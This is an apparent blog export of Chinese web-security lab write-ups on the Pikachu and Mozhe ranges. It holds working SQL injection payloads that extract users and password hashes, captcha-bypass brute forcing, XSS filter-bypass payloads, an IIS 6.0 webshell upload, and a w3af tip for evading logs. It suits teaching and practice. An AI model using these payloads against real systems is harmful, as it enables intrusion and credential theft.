    <content type="text"><![CDATA[人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。 实验环境:pikachu靶机 基于函数报错的信息获取1.常用的报错函数updatexml(),extractvalue(),floor()2.基于函数报错的信息获取(select,insert,update,delete) 技巧思路:在MySQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息select/insert/update/delete都可以使用报错来获取信息 背景条件:后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端 updatexml函数使用方法updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数updatexml()函数作用:改变(查找并替换)XML文档中符合条件的节点的值语法:updatexml(xml_document,xpathstring,new_value)第一个参数:XML文档的名称第二个参数:XML文档的位置(路径),通过xpath定位 ,也可以是表达式,那么数据库便会将这个表达式去执行第三个参数:new_value,string格式,替换查找到的符合条件的注:xpath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取基于报错信息获取数据,必须要有报错信息的返回 我们使用updatexml()函数构造报错,获取数据库信息使用concat函数将两个字符串一起打印出来,concat中也可以执行表达式(函数)0x7e:为~的16进制,其目的为避免信息不被系统去掉,将结果构造出完整的字符串查看其数据库版本信息:1123&apos; and updatexml(1,concat(0x7e,version()),0)# 查看当前数据库信息: 1123&apos; and updatexml(1,concat(0x7e,database()),0)# 查看当前数据库第一张表:1123&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;pikachu&quot; limit 0,1)),0)# 查出第一个表为httpinfo 依次查询得到的表为httpinfo,membr,message,users,xssblind 查看users表的字段:1123&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1)),0)# 得到users表第一个字段为id,第二个字段为username,第三个字段为password,第四个为level 查看用户名1123&apos; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)# 得到users表的用户名分别为:admin,pikachu,test 查看其对应的密码1123&apos; and updatexml(1,concat(0x7e,(select password from users where username=&apos;admin&apos; limit 0,1)),0)# 得到admin用户的经过MD5加密的值,解密为123456 extractvalue()函数使用方法extractvalue()函数:从目标XML中返回包含所查询值的字符串语法:ExtractValue(xml_document,xpath_string)第一个参数:XML_document是string格式,为XML文档对象的名称,文中为Doc第二个参数:XPath_string(Xpath格式的字符串)XPath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取获取数据库信息:11&apos; and extractvalue (0,concat(0x7e,database()))# 其后续操作与updatexml函数操作一致,我就不继续写下去啦 floor()函数使用方法floor():MySQL中用来取整的函数.使用floor函数必须要满足三个条件:其SQL语句中存在count函数,rand函数,group by 这三个值才可以使用其payload为:1xxx&apos; and (select 2 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a )# 关于floor报错原理分析请参考此篇文章:http://blog.51cto.com/chichu/2051375]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu靶机实战之暴力破解]]></title>
    <url>%2F2019%2F01%2F02%2Fpikachu%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[态度决定高度! 靶机简介Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 是个适合新手练习的靶场Pikachu上的漏洞类型列表如下：Burt Force(暴力破解漏洞)XSS(跨站脚本漏洞)CSRF(跨站请求伪造)SQL-Inject(SQL注入漏洞)RCE(远程命令/代码执行)Files Inclusion(文件包含漏洞)Unsafe file downloads(不安全的文件下载)Unsafe file uploads(不安全的文件上传)Over Permisson(越权漏洞)../../../(目录遍历)I can see your ABC(敏感信息泄露)PHP反序列化漏洞XXE(XML External Entity attack)不安全的URL重定向SSRF(Server-Side Request Forgery)More…(找找看?..有彩蛋!)管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~ 安装和使用Pikachu使用世界上最好的语言PHP进行开发-_-，数据库使用的是mysql，因此运行Pikachu你需要提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境，建议在你的测试环境直接使用 一些集成软件来搭建这些基础环境,比如XAMPP,WAMP等,作为一个搞安全的人,这些东西对你来说应该不是什么难事。接下来:–&gt;把下载下来的pikachu文件夹放到web服务器根目录下;–&gt;根据实际情况修改inc/config.inc.php里面的数据库连接配置;–&gt;访问 http://x.x.x.x/pikachu ,会有一个红色的热情提示”欢迎使用,pikachu还没有初始化，点击进行初始化安装!”,点击即可完成安装。 暴力破解实验Burte Force（暴力破解）概述 暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。 基于表单的暴力破解我们使用burpsuite进行暴力破解,由于前端没有验证码等防范暴力破解的措施,我们直接输入用户名密码,发送到burpsuite的intruder模块,一般用户名为admin,administrator(Windows环境)或者root(Linux环境),我设置admin为用户名,对其密码进行爆破 不安全的验证码-on client常见问题验证码作用:1,防止暴力破解2,防止机器恶意注册 验证码的认证流程:客户端request登录页面,后台生成验证码1,后台使用算法生成图片,并将图片response给客户端2,同时将算法生成的值全局赋值存到session中. 校验验证码:1,客户端将认证信息和验证码一同提交2,后台对提交的验证码和session里面的进行比较 客户端重新刷新页面,再次生出新的验证码验证码算法中一般包含随机函数,所以每次刷新都会改变 不安全的客户端验证码常见问题:1,使用前端js实现验证码(纸老虎)2,将验证码在cookie中泄露,容易被获取3,将验证码在前端源代码中泄露,容易被获取 开始试验:首先尝试输入错误的用户名,密码+错误的验证码,点击登录页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常当查看源代码的时候发现是前台生出的验证码如果后台不对前台输入的验证码进行校验的话,那么通过burp代理(客户端和服务端中间人)即可绕过验证码我们使用burp抓包看看是否对输入的验证码进行校验,结果是用户名或者密码不存在然后换个账号密码继续发包,判断服务器端是否对用户前端输入的验证码进行校验还是用户名密码不正确,但并未返回验证码不正确 我们都知道当用户输入账号密码和验证码之后,服务器端首先验证验证码是否正确,如果不正确直接返回验证码不正确,如果验证码正确,那么服务器端会接着验证用户名密码是否正确.我们刚刚的结果是用户名或者密码不存在,表示验证码验证那一关我们是完美的避过了,然后再爆破用户名密码即可爆破出用户名为:admin/123456pikachu/000000test/abc123 不安全的验证码-on server常见问题不安全的验证码-on server常见问题1,验证码在后台不过期,导致可以长期被使用2,验证码校验不严格,逻辑出现问题3,验证码设计的太过简单和有规律,容易被猜解 针对于第一个验证码在后台不过期的漏洞,开始实验首先尝试输入错误的用户名,密码+错误的验证码,点击登录burp抓返回包页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录burp抓返回包页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录burp抓返回包页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常 当刷新页面,客户端向服务器发出请求,生出新的验证码,同时后台会在session中将这个验证码存下来(存下来的目的是为了对用户输入的验证码进行验证),所以当输入错误的验证码或者空的验证码的时候都会提示验证码错误,只有正确的验证码才可以被服务器接受 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了.1,首先先正常提交用户名密码验证码,然后发送到repeater模块中2,关闭burp代理功能,刷新页面,会生出新的验证码,记住新的验证码3,在repeater模块中将新的验证码写入,重放发现其提示是用户名密码错误4,将账户名密码替换,试试验证码还有没有效5,因为无论怎么替换用户名和密码,验证码都正确,所以那么这一关我们是完美的避过了,然后再爆破用户名密码即可 漏洞分析:其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦 修复方法:法一,在php.ini配置文件中设置过期时间法二,在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效) token防止暴力破解?曾经网上有人说可以使用token防止暴力破解,其原理就是当用户打开页面时,后端生出一个token值,token会被存放到session中去,同时服务端会将token发送到前端的表单中,当用户输入账号密码点击确认的时候,客户端会将账号密码+token一起发送到服务器端,当刷新页面之后,token即就会变化 但是token会被显示在前端的表单中,黑客完全可以通过代码获取表单的token,然后配合暴力破解即可]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS攻击学习笔记]]></title>
    <url>%2F2018%2F11%2F19%2Fxss%2F</url>
    <content type="text"><![CDATA[疲惫生活中的英雄梦想! 作者：不二链接：https://www.zhihu.com/question/47828293/answer/138946648来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 XSS攻击xss攻击(跨站脚本攻击的简称)是指攻击者利用网站程序对用户输入过滤不足的缺陷,输入可以显示在界面上对其他用户造成影响的HTML代码,从而盗取用户资料,利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式.其英文全称为Cross site Scripting,原本缩写应当是CSS,但为了和层叠样式表(CSS)有所区分,通常将其缩写为XSS. XSS攻击的原理:跨站脚本攻击本质上是将一种恶意代码嵌入到当前网页中并执行的攻击方式.通常情况下,黑客通过”HTML注入”行为篡改网页,并插入恶意JavaScript脚本,从而在用户浏览网页的时候控制浏览器的行为.这种漏洞产生的主要原因是网站对于用户提交的数据过滤不严格,导致用户提交的数据可以修改当前页面或者插入一段脚本. XSS攻击风险的功能点:评价功能:用户输入评价(评价处为攻击代码)–服务器接收到评论并存储(存储到数据库中)–前台自动调用评论–任何人触发评论(即看到攻击代码便表示已触发漏洞)–攻击成功 论坛私信功能:用户发送私信(私信内夹带攻击代码)–服务器接受私信并存储(存储到数据库中)–收信用户打开私信(展示攻击代码)–攻击成功 XSS攻击分类:XSS攻击通常在用户访问目标网站时或者之后进行某项动作时触发并执行.根据攻击代码的存在地点及是否被服务器存储,并且根据XSS攻击存在的形式及产生的效果,可以将其分为以下三类:(1) 反射型跨站攻击:涉及浏览器–服务器交互(2) 存储型跨站攻击:涉及浏览器–服务器–数据库交互(3) DOM型跨站攻击:涉及浏览器–服务器交互目前,可直接产生大范围危害的是存储型跨站攻击.攻击者可利用JS脚本编写各类型攻击,实现偷取用户cookie,进行内外探测,弹出广告的行为.攻击者构造的JS脚本会被存储型跨站漏洞直接存储到数据库中,一旦有人访问含有XSS漏洞的页面,则攻击者插入的JS脚本生效,攻击成功. 反射型XSS存在反射型XSS漏洞的页面只是将用户输入的数据通过URL的形式直接或未经过完善的安全过滤就在浏览器中进行输出,会导致输出的数据中存在可被浏览器执行的代码数据.由于此种类型的跨站代码存在于URL中,因此黑客通常需要通过诱骗或加密变形等方式,将存在而已代码的链接发给用户,只有用户点击以后才能使攻击成功实施. 存储型XSS存储型XSS脚本攻击是指web应用程序将用户输入的数据信息保存在服务端的数据库或其他文件形式中,网页进行数据查询展示时,会从数据库中获取数据内容,并将数据内容在网页中进行输出展示.只要用户访问具有XSS攻击脚本的网页时,就会触发攻击效果,因此存储型XSS具有较强的稳定性.存储型XSS脚本攻击最为常见的场景就是在博客或新闻发布系统中,黑客将包含恶意代码的数据信息直接写入文章或文章评论中,所有浏览文章或评论的用户就会被黑客在他们的客户端浏览器环境中执行插入的恶意代码. 基于DOM的XSS利用JavaScript的DOM节点编程可以改变HTML代码代码这个特性而形成的XSS攻击.基于DOM的XSS攻击往往需要针对具体的JavaScript DOM代码进行分析,并根据实际情况进行XSS攻击的利用.但实际应用中,由于构造语句具有较大的难度,且实现效果及要求较为苛刻,因此较为少见. XSS攻击的条件XSS漏洞的利用过程较为直接.反射型/DOM型跨站攻击均可以理解为:服务器收到数据,并原样返回给用户,整个过程中web应用并没有自身的存储过程(存入数据库).这就导致了攻击无法持久化,仅针对当前请求有效,也就无法直接攻击到其他用户.当然,这两类攻击也可以利用钓鱼,垃圾邮件等手段产生攻击其他用户的效果. 作为攻击者,如果要利用存储型跨站漏洞,则先要将攻击脚本存储在服务器端,并且保证攻击脚本在读取后可顺利执行.当应用功能对上述条件都满足时,才可保证漏洞被成功利用. 作为防护者,从防护角度来看,可以选择禁止攻击脚本存储在数据库,即在入库之前做处理;或者对攻击脚本进行转义,避免出库时顺利执行.满足以上两种条件的任何一个即可实现有效的防护. 基本测试流程寻找注入点一般情况下,XSS攻击是通过”HTML注入”方式来实现的.即就是攻击者通过提交参数,意图修改当前页面的HTML结构.XSS成功时,提交的参数格式可在当前页面拼接成可执行脚本.可见,XSS漏洞存在的要求就是:当前页面存在参数显示点,且参数显示点可被用户控制输入.因此,寻找用户端可控的输入点是XSS攻击成功的第一步. 在一个常规的网站,存储型XSS一般发生在留言板,在线信箱,评论栏等处,表现特征是用户可自行输入数据,并且数据会提交给服务器.通常可以通过观察页面的交互行为来确定输入点.通常情况下,要求可提交数据量至少在20个字符以上,否则JavaScript脚本很难执行. 除了直接观察以外,利用web代理工具抓包来查看提交参数也是寻找输入点的一个有效途径.在一些输入点隐蔽或者用户输入被JS脚本限制的页面,可以利用Burpsuite抓包的方式寻找输入点.通过直接抓取HTTP包,观察里面是否含有隐藏参数,并且对隐藏参数在页面进行定位,即可找到输入点位置. 测试输出位置测试主要基于两个目的:(1) 确定网站对输入内容是否进行了输出,判断是否可以展开XSS攻击.(2) 有时候需要根据输出的位置的HTML环境编写有效的XSS代码. 测试基本跨站代码测试XSS攻击的经典方式就是”弹窗测试”,即在输入中插入一段可以产生弹窗效果的JavaScript脚本,如果刷新页面产生了弹窗,表名XSS攻击测试脚本.在留言板中插入如下的弹窗测试脚本: alert(/xss/)这段代码的意义是:通过JavaScript执行弹窗命令,弹窗命令为alert,内容为/xss/.点击”提交”按钮,并刷新页面,观察网站,发现出现弹窗,表明测试成功.至此可确认,此功能点存在存储型跨站漏洞. XSS进阶测试方法以上介绍了基础的漏洞环境,并且没有添加任何安全防护手段.本节以alert(/xss/)语句为例,后台设置了针对标签的过滤.当用户传入的参数包含上述两个标签时,会被直接删掉,所以需要学会识别漏洞的防护方式并寻找绕过思路.(1) 闭合标签测试当上述的经典测试代码失效的时候,需要对输出点进一步进行分析,判断输出点周围的标签环境,修改测试代码来达到XSS效果. 使用浏览器的”查看网页源代码”来分析网页源码,在测试点为”内容”的框内输入”444”,以寻找输出点. 12345&lt;tr bgcolor=&quot;#ffffff&quot;&gt; &lt;td colspan=&quot;2&quot;&gt;内容: &lt;textarea&gt;444&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt; 观察代码倒数第二行,发现之前提交的测试内容在一对多行文本框1&lt;textarea&gt;&lt;/textarea&gt; 由于存在这对标签,导致在该标签中的内容即使出现了JavaScript脚本,也会被浏览器当作文本内容进行显示,并不会执行JavaScript语句.面对这种参数输出在标签内的情况,在构造注入语句时,需要先闭合前面的1&lt;textarea&gt; 标签,进而使原有的标签内容失效,再构造JavaScript语句,这里使用的测试代码为:1&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 其中用于闭合参数输出点前面的1&lt;textarea&gt; 富文本标签.成功闭合标签之后,则后面的script脚本即可执行.而最后的1&lt;/textarea&gt; 由于没有与其闭合的标签,所以没有任何实际效果. (2)大小写混合测试因为JavaScript不区分大小写,我们可以将某个XSS代码使用大小写结合的方式发送给服务器端,可以避过一些黑名单过滤技术.,比如: 1&lt;Script&gt;alert(/xss/)&lt;/scRipt&gt; (3)多重嵌套测试:当大小写混合的模式行行不通的时候,我们可以尝试使用将两个关键字进行嵌套,让服务器过滤一个多余的关键词,留下的内容会自动拼接成有效词,举个栗子:1&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; 以上测试代码构建思路为:由于 &lt;script&gt; 标签会被自动删除,因此构造攻击代码为 &lt;scr&lt;script&gt;ipt&gt; 这样 &lt;script&gt; 会被自动删除,留下的 &lt;scr ipt&gt; 会自动构成 &lt;script&gt; ,这样的手段即为多重嵌套测试. (4)多标签测试在测试XSS的过程中,能够触发弹窗效果的远不止 &lt;script&gt; 这一种标签.在不同的浏览器,不同的场景,不同的环境下,能够触发攻击效果的跨站代码也不尽相同.可以参加此链接:XSS现代WAF规则探测及绕过技术 “”) XSS语句的基本特点是利用各类JS脚本特征来设计触发点,攻击代码则利用各类型编码或者外部引用方式进行加载.该链接只是给出了一部分,在实践中千变万化,利用方式也各不相同.]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>web漏洞,手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[凌云志]]></title>
    <url>%2F2018%2F11%2F07%2F%E5%87%8C%E4%BA%91%E5%BF%97%2F</url>
    <content type="text"><![CDATA[雨落惊得杨柳斜，少年蹒跚几经劫。过荆棘如履平地，流血依旧笑欢颜。千难万阻志不灭，惧他风雪万里渊？他日我得凌云志，日晖逊色半边天！]]></content>
      <categories>
        <category>励志</category>
      </categories>
      <tags>
        <tag>励志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS6.0容器之解析漏洞复现]]></title>
    <url>%2F2018%2F10%2F30%2FIIS6.0%E5%AE%B9%E5%99%A8%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[态度决定高度! 漏洞简介解析漏洞是指web服务器因对HTTP请求处理不当导致将非可执行的脚本,文件等当作可执行的脚本去执行.该漏洞一般配合web容器(iis,nginx,apache,tomcat等)的文件上传功能去使用,以获取服务器的权限. IIS5.X/6.X解析漏洞对于IIS服务器5版本和6版本存在两个解析漏洞,分别为目录解析和文件解析 目录解析简介:在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.举个栗子:/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关. 实验:我们这里使用墨者学院提供的实验环境去复现该漏洞执行过程.(墨者学院解析漏洞链接) 我们在界面先上传一个普通文件,通过F12控制台查看消息头,得知目标服务器为Microsoft-IIS/6.0,也有需要上传的地方,我们可以试试目录解析漏洞.我们先随意上传一个文件,观其url发现是asp脚本构造的页面,然后在本地制作一个asp的一句话木马保存到一个文件中,然后打开burpsuite的代理功能去进行抓包修改我们在发送的POST请求中发现刚刚发送的asp.txt被保存的第二个upload文件下,为了让其执行,所以我们在第二个upload后面加入/webshell.asp文件,这样就能将asp.txt这个一句话木马放入webshell.asp中,便可以利用解析漏洞直接将asp.txt当作asp脚本去执行在burp中转发浏览器显示成功上传,并列出上传的地址成功的将asp一句话木马上传到目标服务器中,这样我们可以使用中国菜刀去远程连接 文件解析/后缀解析简介:在IIS6.0下,分号后面的内容不被解析,举个栗子,xx.asp;.jpg将会当作xx.asp去解析执行.IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer. 例如：test.asa 、 test.cdx 、 test.cer 实验:继续使用刚刚的环境,我们将刚刚的asp木马文件名修改为webshell.asp;.txt,因为该网站不允许上传以asp作为后缀的文件名,所以我们使用.txt后缀,但分号后面的内容将会被IIS过滤不去解析,所以这就是个asp脚本.我们将文件直接上传到upload目录下,然后使用菜刀连接,也是可以连接上的.https://i.loli.net/2018/10/30/5bd7346bd84d0.png当然顺便也能找到所需要的key值]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者学院--手工注入mysql数据库实例]]></title>
    <url>%2F2018%2F10%2F23%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[发现漏洞 开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息. 注入测试我们可以试试1=1和1=2大法,输入在参数id=1后面加入1=1进行逻辑判断显示正常,然后换1=2,因为1=2为一个假命题,如果能插入到数据库进行逻辑判断,那么由于该语句错误,数据库查询不到任何信息,界面就不会显示任何信息根据这种情况可以大概的判断出该网站很大可能存在SQL注入漏洞.我们可以大概的猜测出该web页面中背后的SQL语句为 1select column1,column2..... from table where id=$_GET[&quot;id&quot;] 然后通过order by判断出该SQL语句查询有多少列(或者说查询多少个字段),order by用于对筛选出来的结果按照列(关键字)进行排序,对于多列的时候，先按照第一个column name排序，如果第一个column name相同,则按照第二个column name排序,我们输入: 12http://219.153.49.228:42182/new_list.php?id=1 order by 1,2,3,4,5#假设该SQL语句中查询了5个关键字,如果没报错,那么表示所查询的关键字大于或者等于5,如果报错表示查询的小于5 出现报错,表示所选择的关键字小于5,我们换成3,可以正确显示其界面,换成4也可以正常显示,所以可以得出所选择的关键字个数为4.那么其SQL语句为: 1select column1,column2,column3,column4 from table where id=$_GET(&quot;id&quot;) 接下来判断在页面中可以显示的关键字其SQL语句为: 1select column1,column2,column3,column4 from table where id=5 union select 1,2,3,4 注:由上面的操作得出该SQL语句查询4个关键字,我们将id=5,则对于第一个SQL语句由于不满足where条件而不显示其内容,所以执行第二条语句,select 1,2,3,4就是判断在页面中显示的是哪些关键字.)由这个信息可以得出显示的是第二个和第三个字段的内容 获取数据库信息我们将第二个和第三个字段换成MySQL数据库中的函数,即可获取其数据库的信息使用user()函数可以得知当前数据库的使用者使用database()函数可以得知当时数据库的名称)该MYSQL数据库名叫mozhe_Discuz_StormGroup,当前使用者为root在MYSQL数据库中有一个数据库叫information_schema数据库,它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。可以简单的理解为数据词典或者系统目录. )其命令为: 12http://219.153.49.228:42182/new_list.php?id= 5 union select 1, schema_name ,3,4 from information_schema.schemata limit 0,1 注:limit 0,1表示从第0行起,取第一行数据,第一行为information_schema,举个例子:)limit 0,1即就是指dvwa数据库limit1,1即就是information_schema数据库回到原来的注入问题,我们将limit 0,1换成limit 1,1 limit 2,2 limit 3,3 limit 4,4 information_schema,mozhe_Discuz_StormGroup,mysql,performance_schema,sys这五个数据库,当输入limit5,5页面没有内容表示目前拥有五个数据库.然后枚举数据库中的数据表注入的URL为: 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,table_name,3,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 获得mozhe_Discuz_StormGroup数据库的第一张表为StormGroup_member)将0,1替换为1,1所得到的数据表为notice,替换成2,2则没有显示任何数据表示该数据库只有两张表.所以得到数据库mozhe_Discuz_StormGroup中有两张表为StormGroup_member和notice表,那么我们查其列.1http://219.153.49.228:43635/new_list.php?id=5 union select 1,column_name,3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos; limit 0,1 得到在其StormGroup_member表下有个列为id,我们将0,1替换成1,1 2,2 3,3 得到的列分别是name,password,status那么可以得知在mozhe_Discuz_StormGroup数据库的StormGroup_member表下有四列分别是id,name,password,status 12http://219.153.49.228:43635/new_list.php?id=5 union select 1,name,3,4 from StormGroup_member limit 0,1 )查找其密码列 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,password,3,4 from StormGroup_member limit 0,1 )将此密码进行MD5解密可得明文密码)然后我们就可以进入后台管理系统啦]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w3af--命令行模式实验简述]]></title>
    <url>%2F2018%2F10%2F23%2Fw3af-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%AE%9E%E9%AA%8C%E7%AE%80%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[实验环境:Kali:192.168.128.128Metasploitable:192.168.128.129 安装W3af:简介及安装w3af文档w3af用户接口: ​ console命令行接口 ​ Gui图形界面化接口 ​ API接口 开始操作123456789101112131415161718192021222324root@kali:~/w3af-master# ./w3af_console w3af&gt;&gt;&gt; w3af&gt;&gt;&gt; help #help命令列出当前命令提示符下的可用指令|-----------------------------------------------------------------------------------|| start | Start the scan. 开始扫描 || plugins | Enable and configure plugins. 选择和配置插件 || exploit | Exploit the vulnerability. 使用该模块进行攻击漏洞 || profiles | List and use scan profiles. 列出可以用来扫描的文件 || cleanup | Cleanup before starting a new scan. 在开始新扫描之前进行清理 ||-----------------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more specific help || | about &quot;command&quot; || version | Show w3af version information. 显示w3af版本信息 || keys | Display key shortcuts. 显示关键快捷方式。 ||-----------------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. 配置框架的HTTP设置。 || misc-settings | Configure w3af misc settings. 配置w3af misc设置 || target | Configure the target URL. 配置目标URL ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. 返回前一目录 || exit | Exit w3af. 退出 ||-----------------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base 浏览存储在知识库中的漏洞 ||----------------------------------------------------------------------------------- 12345678910111213141516171819w3af&gt;&gt;&gt; plugins #输入plugins,进入插件目录的内,w3af/plugins&gt;&gt;&gt; help #输入help显示当前可使用的命令|-----------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|| output | View, configure and enable output plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || crawl | View, configure and enable crawl plugins || auth | View, configure and enable auth plugins || mangle | View, configure and enable mangle plugins || bruteforce | View, configure and enable bruteforce plugins ||-----------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; list audit 或者audit #列出audit插件类中的小插件 也可以在图形界面化直观的看清其结构 1234567891011#使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个#那么再次列出时这些插件的Status将会变成Enabled,如果进行扫描,那么就会针对这些漏洞去扫描w3af/plugins&gt;&gt;&gt; audit xss sqli lfi #使用audit模块中的所有插件进行扫描w3af/plugins&gt;&gt;&gt; audit all#输入crawl模块,按两次tab键,可以显示该模块下的插件w3af/plugins&gt;&gt;&gt; crawl genexus_xml wordpress_fingerprint dot_listing content_negotiation robots_txt archive_dot_org ria_enumerator wordnet user_dir sitemap_xml bing_spider dir_file_bruter phpinfo find_dvcs import_results urllist_txt google_spider url_fuzzer find_backdoors web_spider spider_man find_captchas oracle_discovery wsdl_finder wordpress_enumerate_users web_diff dwsync_xml pykto wordpress_fullpathdisclosure phishtank digit_sum open_api dot_ds_store ghdb all config desc w3af/plugins&gt;&gt;&gt; crawl web_spider #选择该模块下的web爬虫模块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485w3af&gt;&gt;&gt; profiles #进入profiles模块,这个模块用于自定义组合插件,当然w3af自定义了一些组合插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||------------------------------------------------------------------------------w3af/profiles&gt;&gt;&gt; list #列出在profiles模块下的插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. #保存当前配置到一个文件内 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/profiles&gt;&gt;&gt; save_as test #使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内Profile saved.#使用下列命令将test文件独立出来,以便供其他人使用w3af/profiles&gt;&gt;&gt; save_as test self-containedw3af/profiles&gt;&gt;&gt; use test #使用自定义的test文件中的配置进行扫描The plugins configured by the scan profile have been enabled, and their options configured.Please set the target URL(s) and start the scan.w3af/profiles&gt;&gt;&gt; back #返回上一级w3af&gt;&gt;&gt; http-settings #进入http-settings,设置全局参数w3af/config:http-settings&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. #设置参数值 || save | Save the configured settings. #保存配置 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. #返回上一目录 || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/config:http-settings&gt;&gt;&gt; view #列出可用的操作和其值|---------------------------------------------------------------------------------#设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现w3af/config:http-settings&gt;&gt;&gt; set rand_user_agent True w3af/config:http-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; misc-settings #进入misc-setting全局设置选项中w3af/config:misc-settings&gt;&gt;&gt; view #查看需要配置的参数w3af/config:misc-settings&gt;&gt;&gt; set fuzz_url_filenames True 